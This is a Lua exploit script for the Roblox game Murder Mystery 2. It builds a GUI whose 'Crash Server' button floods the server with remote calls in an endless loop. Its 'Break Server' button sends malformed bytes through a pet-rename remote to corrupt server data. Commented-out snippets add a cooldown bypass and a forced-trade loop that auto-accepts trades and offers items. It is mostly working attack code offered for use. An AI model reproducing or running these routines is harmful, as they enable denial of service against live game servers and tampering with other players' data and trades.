/* 
Private GUI for MM2 , version: 2
GUI: hertz#2004
Script: Rise & hertz
 
NOTE FOR HERTZ: ADD CONFIRMATION BYPASS 
*/

-- Data Break: 
/* 
game:GetService("ReplicatedStorage").RenamePet:FireServer('\237\191\154') 
*/ 

------------------------------------------------------------

-- Crasher:
/*
local e = game:GetService("ReplicatedStorage").GetSyncData
local InvokeServer = e.InvokeServer
local spawn = task.spawn
local a = 0;

while 1 do
    for i=1, 1 do
        spawn(InvokeServer, e)
    end
    a = a + 1
    if a == 3 then
        a = 0
        wait(0)
    end
end
*/

------------------------------------------------------------

-- Bypass Timer: 
/* local mm2 = require(game.ReplicatedStorage.Modules.ItemModule)
mm2.ResetCooldown = function() end
*/ 

------------------------------------------------------------

-- Force Trade: 
/* 

local username = ""
while true  do
    task.wait(0.000001)
game:GetService("ReplicatedStorage").Trade.AcceptRequest:FireServer()
game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()

local ohInstance1 = game:GetService("Players").username

game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(ohInstance1)
local ohString1 = "LugerChroma"
local ohString2 = "Weapons"

game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(ohString1, ohString2)


end
*/

-- Generated using RoadToGlory's Converter v1.1 (RoadToGlory#9879)

-- Instances:


local Converted = {
	["_ScreenGui"] = Instance.new("ScreenGui");
	["_MainFrame"] = Instance.new("Frame");
	["_UICorner"] = Instance.new("UICorner");
	["_Header"] = Instance.new("Frame");
	["_UICorner1"] = Instance.new("UICorner");
	["_HeaderTitle"] = Instance.new("TextLabel");
	["_Credits"] = Instance.new("TextLabel");
	["_Border"] = Instance.new("TextLabel");
	["_Border2"] = Instance.new("TextLabel");
	["_RestoreServer"] = Instance.new("TextButton");
	["_UICorner2"] = Instance.new("UICorner");
	["_BypassTimer"] = Instance.new("TextButton");
	["_UICorner3"] = Instance.new("UICorner");
	["_CrashServer"] = Instance.new("TextButton");
	["_UICorner4"] = Instance.new("UICorner");
	["_BreakServer"] = Instance.new("TextButton");
	["_UICorner5"] = Instance.new("UICorner");
}

-- Properties:

Converted["_ScreenGui"].Parent = game:GetService("CoreGui")

Converted["_MainFrame"].Active = true
Converted["_MainFrame"].BackgroundColor3 = Color3.fromRGB(65.0000037252903, 65.0000037252903, 65.0000037252903)
Converted["_MainFrame"].BorderColor3 = Color3.fromRGB(170.0000050663948, 0, 0)
Converted["_MainFrame"].Position = UDim2.new(0.130615219, 0, 0.225988686, 0)
Converted["_MainFrame"].Size = UDim2.new(0, 405, 0, 254)
Converted["_MainFrame"].Name = "MainFrame"
Converted["_MainFrame"].Parent = Converted["_ScreenGui"]
Converted["_MainFrame"].Draggable = true

Converted["_UICorner"].Parent = Converted["_MainFrame"]

Converted["_Header"].Active = true
Converted["_Header"].BackgroundColor3 = Color3.fromRGB(149.00000631809235, 0, 0)
Converted["_Header"].BorderSizePixel = 0
Converted["_Header"].Size = UDim2.new(0, 405, 0, 36)
Converted["_Header"].Name = "Header"
Converted["_Header"].Parent = Converted["_MainFrame"]

Converted["_UICorner1"].Parent = Converted["_Header"]

Converted["_HeaderTitle"].Font = Enum.Font.Bangers
Converted["_HeaderTitle"].RichText = true
Converted["_HeaderTitle"].Text = "MM2 TOOLS    ||    JOIN DISCORD FOR USAGE GUIDE"
Converted["_HeaderTitle"].TextColor3 = Color3.fromRGB(245.00001579523087, 245.00001579523087, 245.00001579523087)
Converted["_HeaderTitle"].TextSize = 18
Converted["_HeaderTitle"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_HeaderTitle"].BackgroundTransparency = 100
Converted["_HeaderTitle"].BorderSizePixel = 0
Converted["_HeaderTitle"].Size = UDim2.new(0, 86, 0, 37)
Converted["_HeaderTitle"].Name = "HeaderTitle"
Converted["_HeaderTitle"].Parent = Converted["_Header"]

Converted["_Credits"].Font = Enum.Font.Bangers
Converted["_Credits"].RichText = true
Converted["_Credits"].Text = "Made By hertz#2004"
Converted["_Credits"].TextColor3 = Color3.fromRGB(245.00001579523087, 245.00001579523087, 245.00001579523087)
Converted["_Credits"].TextSize = 12
Converted["_Credits"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Credits"].BackgroundTransparency = 100
Converted["_Credits"].BorderSizePixel = 0
Converted["_Credits"].Position = UDim2.new(0.770370364, 0, 0.88188976, 0)
Converted["_Credits"].Size = UDim2.new(0, 86, 0, 37)
Converted["_Credits"].Name = "Credits"
Converted["_Credits"].Parent = Converted["_MainFrame"]

Converted["_Border"].Font = Enum.Font.Bangers
Converted["_Border"].RichText = true
Converted["_Border"].Text = "-----------------------------------------------------------------------------------------------------"
Converted["_Border"].TextColor3 = Color3.fromRGB(136.00000709295273, 0, 0)
Converted["_Border"].TextSize = 12
Converted["_Border"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Border"].BackgroundTransparency = 100
Converted["_Border"].BorderSizePixel = 0
Converted["_Border"].Position = UDim2.new(-0.034567941, 0, 0.342519671, 0)
Converted["_Border"].Size = UDim2.new(0, 433, 0, 37)
Converted["_Border"].Name = "Border"
Converted["_Border"].Parent = Converted["_MainFrame"]

Converted["_Border2"].Font = Enum.Font.Bangers
Converted["_Border2"].RichText = true
Converted["_Border2"].Text = "-----------------------------------------------------------------------------------------------------"
Converted["_Border2"].TextColor3 = Color3.fromRGB(136.00000709295273, 0, 0)
Converted["_Border2"].TextSize = 12
Converted["_Border2"].BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Converted["_Border2"].BackgroundTransparency = 100
Converted["_Border2"].BorderSizePixel = 0
Converted["_Border2"].Position = UDim2.new(-0.034567941, 0, 0.625984192, 0)
Converted["_Border2"].Size = UDim2.new(0, 433, 0, 37)
Converted["_Border2"].Name = "Border2"
Converted["_Border2"].Parent = Converted["_MainFrame"]

Converted["_RestoreServer"].Font = Enum.Font.Bangers
Converted["_RestoreServer"].Text = "Restore Server"
Converted["_RestoreServer"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_RestoreServer"].TextSize = 18
Converted["_RestoreServer"].BackgroundColor3 = Color3.fromRGB(136.00000709295273, 0, 0)
Converted["_RestoreServer"].Position = UDim2.new(0.309616983, 0, 0.456584424, 0)
Converted["_RestoreServer"].Size = UDim2.new(0, 103, 0, 50)
Converted["_RestoreServer"].Name = "RestoreServer"
Converted["_RestoreServer"].Parent = Converted["_MainFrame"]

Converted["_UICorner2"].Parent = Converted["_RestoreServer"]

Converted["_BypassTimer"].Font = Enum.Font.Bangers
Converted["_BypassTimer"].Text = "Join Discord"
Converted["_BypassTimer"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_BypassTimer"].TextSize = 18
Converted["_BypassTimer"].BackgroundColor3 = Color3.fromRGB(136.00000709295273, 0, 0)
Converted["_BypassTimer"].Position = UDim2.new(0.0243314654, 0, 0.740448594, 0)
Converted["_BypassTimer"].Size = UDim2.new(0, 103, 0, 50)
Converted["_BypassTimer"].Name = "BypassTimer"
Converted["_BypassTimer"].Parent = Converted["_MainFrame"]

Converted["_UICorner3"].Parent = Converted["_BypassTimer"]

Converted["_CrashServer"].Font = Enum.Font.Bangers
Converted["_CrashServer"].Text = "Crash Server"
Converted["_CrashServer"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_CrashServer"].TextSize = 18
Converted["_CrashServer"].BackgroundColor3 = Color3.fromRGB(136.00000709295273, 0, 0)
Converted["_CrashServer"].Position = UDim2.new(0.0243314803, 0, 0.175516576, 0)
Converted["_CrashServer"].Size = UDim2.new(0, 103, 0, 50)
Converted["_CrashServer"].Name = "CrashServer"
Converted["_CrashServer"].Parent = Converted["_MainFrame"]

Converted["_UICorner4"].Parent = Converted["_CrashServer"]

Converted["_BreakServer"].Font = Enum.Font.Bangers
Converted["_BreakServer"].Text = "Break Server"
Converted["_BreakServer"].TextColor3 = Color3.fromRGB(255, 255, 255)
Converted["_BreakServer"].TextSize = 18
Converted["_BreakServer"].BackgroundColor3 = Color3.fromRGB(136.00000709295273, 0, 0)
Converted["_BreakServer"].Position = UDim2.new(0.0243314803, 0, 0.456584454, 0)
Converted["_BreakServer"].Size = UDim2.new(0, 103, 0, 50)
Converted["_BreakServer"].Name = "BreakServer"
Converted["_BreakServer"].Parent = Converted["_MainFrame"]
Converted["_UICorner5"].Parent = Converted["_BreakServer"]



Converted["_CrashServer"].MouseButton1Down:connect(function()
    local e = game:GetService("ReplicatedStorage").GetSyncData
local InvokeServer = e.InvokeServer
local spawn = task.spawn
local a = 0;

while 1 do
    for i=1, 1 do
        spawn(InvokeServer, e)
    end
    a = a + 1
    if a == 3 then
        a = 0
        wait(0)
    end
end
end
    )


Converted["_BreakServer"].MouseButton1Down:connect(function()
    -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = '\237\191\154'
}

game:GetService("ReplicatedStorage").Remotes.Inventory.RenamePet:FireServer(unpack(args))

    end

)

Converted["_RestoreServer"].MouseButton1Down:connect(function()
  -- Script generated by SimpleSpy - credits to exx#9394

local args = {
    [1] = "hertz :3"
}

game:GetService("ReplicatedStorage").Remotes.Inventory.RenamePet:FireServer(unpack(args))

    end
)

Converted["_BypassTimer"].MouseButton1Down:connect(function()
    setclipboard("https://discord.gg/scripter")
    game:GetService("StarterGui"):SetCore("SendNotification",{
        Title = "⚠️ Discord Server ⚠️", -- Required
        Text = "Copied the link to your clipboard", -- Required
        
    })
   
    end
)